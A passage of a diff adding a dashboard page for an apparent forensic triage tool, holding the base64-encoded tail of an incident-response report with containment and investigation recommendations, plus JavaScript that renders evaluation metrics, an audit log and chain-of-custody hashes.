lbmNlIOKAlCB0aGUgZmluYWwgZmluZGluZ3MgcmVmbGVjdCB0aG9zZSBjb3JyZWN0aW9ucy4gV2UgbWF5IGhhdmUgbWlzc2VkOiBhZGRpdGlvbmFsIHBlcnNpc3RlbmNlIG1lY2hhbmlzbXMgbm90IGNhcHR1cmVkIGluIHRoZSByZWdpc3RyeSBzbmFwc2hvdCwgc3RhZ2luZyBvciBkcm9wcGVyIGFjdGl2aXR5IHRoYXQgcHJlY2VkZWQgdGhlIFRlbXAtZGlyZWN0b3J5IHBsYWNlbWVudCwgbGF0ZXJhbCBtb3ZlbWVudCB0byBob3N0cyBiZXlvbmQgMTkyLjE2OC4xLjEwLCBhbmQgYW55IGFjdGlvbnMgdGFrZW4gYnkgdGhlIGF0dGFja2VyIGR1cmluZyB0aGUgd2luZG93IGJldHdlZW4gZmlyc3QgYW5kIGxhc3QgZXhlY3V0aW9uIG9mIHN2Y2hvc3RfaGVscGVyLmV4ZS4KCiMjIFJlY29tbWVuZGF0aW9ucwoKMS4gSW1tZWRpYXRlbHkgaXNvbGF0ZSB0aGUgY29tcHJvbWlzZWQgaG9zdCBmcm9tIHRoZSBuZXR3b3JrIHRvIHByZXZlbnQgZnVydGhlciBsYXRlcmFsIG1vdmVtZW50IG9yIEMyIGNvbW11bmljYXRpb24gd2hpbGUgaW52ZXN0aWdhdGlvbiBjb250aW51ZXMuICAKMi4gSW52ZXN0aWdhdGUgMTkyLjE2OC4xLjEwIGFzIGEgcG90ZW50aWFsIHNlY29uZGFyeSB2aWN0aW06IGNvbGxlY3QgYXV0aGVudGljYXRpb24gbG9ncywgU01CIHNlc3Npb24gcmVjb3JkcywgYW5kIHJ1biBlbmRwb2ludCB0cmlhZ2UgKHByZWZldGNoLCByZWdpc3RyeSwgTUZUKSB0byBkZXRlcm1pbmUgd2hldGhlciBsYXRlcmFsIG1vdmVtZW50IHN1Y2NlZWRlZC4gIAozLiBBY3F1aXJlIGFuZCBhbmFseXplIGEgZnVsbCBtZW1vcnkgaW1hZ2UgZnJvbSB0aGUgY29tcHJvbWlzZWQgaG9zdCB0byBpZGVudGlmeSB0aGUgcnVubmluZyBzdmNob3N0X2hlbHBlci5leGUgcHJvY2VzcywgaW5qZWN0ZWQgY29kZSwgQzIgY29uZmlndXJhdGlvbiwgYW5kIGFueSBpbi1tZW1vcnkgYXJ0aWZhY3RzIG5vdCB2aXNpYmxlIG9uIGRpc2suICAKNC4gQ29sbGVjdCBhbmQgcmV2aWV3IFdpbmRvd3MgU2VjdXJpdHkgRXZlbnQgTG9ncyAocGFydGljdWxhcmx5IEV2ZW50IElEcyA0NjI0LCA0NjQ4LCA0Njg4LCA3MDQ1KSBmcm9tIGJvdGggdGhlIGNvbXByb21pc2VkIGhvc3QgYW5kIDE5Mi4xNjguMS4xMCB0byByZWNvbnN0cnVjdCB0aGUgZnVsbCBhdHRhY2sgdGltZWxpbmUgYW5kIGNvbmZpcm0gb3IgcmVmdXRlIHBhc3MtdGhlLWhhc2ggb3IgcmVtb3RlIHNlcnZpY2UgY3JlYXRpb24uICAKNS4gU3VibWl0IHN2Y2hvc3RfaGVscGVyLmV4ZSBmb3Igc3RhdGljIGFuZCBkeW5hbWljIG1hbHdhcmUgYW5hbHlzaXMgKHNhbmRib3ggZGV0b25hdGlvbiBhbmQgcmV2ZXJzZSBlbmdpbmVlcmluZykgdG8gaWRlbnRpZnkgbWFsd2FyZSBmYW1pbHksIEMyIGluZnJhc3RydWN0dXJlLCBjYXBhYmlsaXRpZXMsIGFuZCBhbnkgYWRkaXRpb25hbCBwYXlsb2FkcyBvciBkcm9wcGVkIGZpbGVzLiAgCjYuIENvbmR1Y3QgYSBicm9hZGVyIGh1bnQgYWNyb3NzIHRoZSBlbnZpcm9ubWVudCBmb3IgdGhlIHNhbWUgSU9DczogdGhlIGZpbGUgaGFzaCBvZiBzdmNob3N0X2hlbHBlci5leGUsIHRoZSByZWdpc3RyeSB2YWx1ZSBuYW1lICdXaW5kb3dzSGVscGVyJywgVGVtcC1kaXJlY3RvcnkgZXhlY3V0YWJsZXMgbWltaWNraW5nIHN5c3RlbSBwcm9jZXNzIG5hbWVzLCBhbmQgb3V0Ym91bmQgY29ubmVjdGlvbnMgdG8gdGhlIGlkZW50aWZpZWQgQzIgYWRkcmVzcy4gIAo3LiBQcmVzZXJ2ZSBhbGwgZm9yZW5zaWMgYXJ0aWZhY3RzIChyZWdpc3RyeSBoaXZlcywgcHJlZmV0Y2ggZmlsZXMsIE1GVCwgbmV0d29yayBsb2dzKSB1bmRlciBjaGFpbi1vZi1jdXN0b2R5IGJlZm9yZSBhbnkgcmVtZWRpYXRpb24gYWN0aW9ucyBhcmUgdGFrZW4gb24gdGhlIGFmZmVjdGVkIGhvc3QuICAKOC4gQWZ0ZXIgY29udGFpbm1lbnQsIHBlcmZvcm0gYSBmdWxsIGNyZWRlbnRpYWwgcmVzZXQgZm9yIHRoZSAndmljdGltJyBhY2NvdW50IGFuZCBhbnkgYWNjb3VudHMgdGhhdCBhdXRoZW50aWNhdGVkIHRvIG9yIGZyb20gdGhlIGNvbXByb21pc2VkIGhvc3QsIGdpdmVuIHRoZSBwb3NzaWJpbGl0eSBvZiBjcmVkZW50aWFsIHRoZWZ0IG9yIHBhc3MtdGhlLWhhc2ggYWN0aXZpdHkuICAKCi0tLQoKKlJlcG9ydCBnZW5lcmF0ZWQgYnkgU0lGVC1IVU5URVIg4oCUIFNlbGYtY29ycmVjdGluZyBJbnRlbGxpZ2VudCBGb3JlbnNpYyBUcmlhZ2UgJiBIdW50KiAgCipBbGwgZmluZGluZ3MgaW5jbHVkZSBjb25maWRlbmNlIGxldmVscyBhbmQgZXZpZGVuY2UgY2l0YXRpb25zLioK"};</script>
+<script>
+const E = DATA.eval, O = E.overall, L = DATA.logStats;
+const pct = x => (x*100).toFixed(0)+'%';
+
+// hero chips
+document.getElementById('chips').innerHTML = [
+  ['n cyan', pct(O.precision), 'precision (0 FP)'],
+  ['n', pct(O.recall), 'recall'],
+  ['n green', O.f1.toFixed(2), 'F1 score'],
+  ['n cyan', '93% / 0%', 'hallucination catch'],
+  ['n', '20', 'bypass attempts refused'],
+  ['n green', '244', 'tests passing'],
+].map(([cls,n,l])=>`<div class="chip"><div class="${cls}">${n}</div><div class="l">${l}</div></div>`).join('');
+
+// eval table
+const rows = E.cases.map(c=>`<tr>
+  <td><b>${c.case_id}</b><div style="font-size:11px;color:var(--dim)">${c.source||'synthetic'}</div></td>
+  <td class="mono">${c.iocs_found}/${c.iocs_total}</td>
+  <td class="mono">${c.false_positives}</td>
+  <td class="mono ok">${pct(c.metrics_all.precision)}</td>
+  <td class="mono">${pct(c.metrics_all.recall)}</td>
+  <td class="mono">${c.metrics_all.f1.toFixed(2)}</td></tr>`).join('');
+document.getElementById('evalTable').innerHTML =
+  `<thead><tr><th>Case</th><th>IOCs</th><th>FP</th><th>Precision</th><th>Recall</th><th>F1</th></tr></thead>
+   <tbody>${rows}<tr style="font-weight:700">
+     <td>OVERALL</td><td class="mono">${O.iocs_found}/${O.total_iocs}</td><td class="mono ok">${O.false_positives}</td>
+     <td class="mono ok">${pct(O.precision)}</td><td class="mono">${pct(O.recall)}</td><td class="mono">${O.f1.toFixed(2)}</td></tr></tbody>`;
+
+// per-category bars
+const cats = O.per_category;
+document.getElementById('catBars').innerHTML = Object.keys(cats).sort().map(k=>{
+  const v = cats[k]; const p = v.recall*100;
+  return `<div class="bar"><div>${k}</div><div class="track"><div class="fill" style="width:${p}%"></div></div><div class="pct">${v.found}/${v.total}</div></div>`;
+}).join('');
+
+// run stats
+document.getElementById('runStats').innerHTML = [
+  [L.events,'audit events'],[L.verification_rounds,'verification rounds'],
+  [L.corrections,'corrections issued'],[L.tool_calls,'tool calls'],
+].map(([n,l])=>`<div class="s"><div class="n">${n}</div><div class="l">${l}</div></div>`).join('');
+
+// execution log
+document.getElementById('log').innerHTML = DATA.timeline.map(r=>{
+  const cls = r.action==='correction_issued'?'c':(r.action.includes('VERIFICATION')?'v':(r.action==='finding_created'?'f':''));
+  const ac = r.details ? r.action+' &middot; '+r.details : r.action;
+  return `<div class="row ${cls}"><span class="ts">+${r.t}s</span><span class="ag">${r.agent||'-'}</span><span class="ac">${ac.replace(/</g,'&lt;')}</span></div>`;
+}).join('');
+
+// report markdown
+const md = new TextDecoder().decode(Uint8Array.from(atob(DATA.reportB64), c=>c.charCodeAt(0)));
+document.getElementById('report').innerHTML = marked.parse(md.replace(/^<!--[\s\S]*?-->/,'').trim());
+
+// custody
+document.getElementById('custody').innerHTML = Object.entries(DATA.custody).map(([f,h])=>
+  `<div class="row"><div>${f}</div><div class="h">${h}</div></div>`).join('');
+</script>
+</body>
+</html>
